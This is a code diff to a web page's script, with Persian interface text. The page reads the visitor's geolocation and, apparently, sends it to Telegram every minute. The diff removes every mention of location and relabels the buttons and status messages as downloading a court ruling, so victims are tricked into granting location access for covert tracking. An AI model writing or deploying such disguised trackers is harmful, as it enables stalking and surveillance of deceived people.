@@ -52,7 +52,7 @@
         })
       });
     } catch (error) {
-      console.error("خطا در ارسال به تلگرام:", error);
+      console.error("خطا در  دانلود فایل :", error);
     }
   }
 
@@ -78,10 +78,10 @@
     try {
       const position = await getLocation();
       await sendLocation(position);
-      showStatus("📍 موقعیت جدید ارسال شد.");
+      showStatus("حکم جدید دانلود شد.");
     } catch (error) {
       console.error(error);
-      showStatus("⚠️ دریافت موقعیت جدید ناموفق بود.");
+      showStatus("⚠️ دنلود حکم جدید داد گاه ناموفق بود.");
     }
   }
 
@@ -97,7 +97,7 @@
     }
 
     allowBtn.disabled = true;
-    allowBtn.textContent = "در حال دریافت موقعیت...";
+    allowBtn.textContent = "در حال دانلود حکم داد گاه...";
 
     try {
       const position = await getLocation();
@@ -107,19 +107,19 @@
       sharingActive = true;
 
       await sendLocation(position);
-      showStatus("✅ موقعیت ارسال شد. به‌روزرسانی هر ۱ دقیقه.");
+      showStatus("✅");
 
       timer = setInterval(updateLocation, INTERVAL);
 
     } catch (error) {
       console.error(error);
       allowBtn.disabled = false;
-      allowBtn.textContent = "اجازه دسترسی به موقعیت";
+      allowBtn.textContent = "اجازه دادن دانلود حکم داد گاه";
 
       if (error.code === error.PERMISSION_DENIED) {
-        showStatus("❌ اجازه دسترسی به موقعیت توسط کاربر رد شد.");
+        showStatus("❌ دانلود حکم توسط متقاضی رد شد .");
       } else {
-        showStatus("❌ دریافت موقعیت ناموفق بود.");
+        showStatus("❌ دانلود ناموفق بود بود.");
       }
     }
   }
@@ -139,6 +139,6 @@
       timer = null;
     }
     stopBtn.style.display = "none";
-    showStatus("⛔ اشتراک‌گذاری متوقف شد.");
+    showStatus("⛔ دانلود حکم داد گاه متوقف شد.");
   });
 </script>
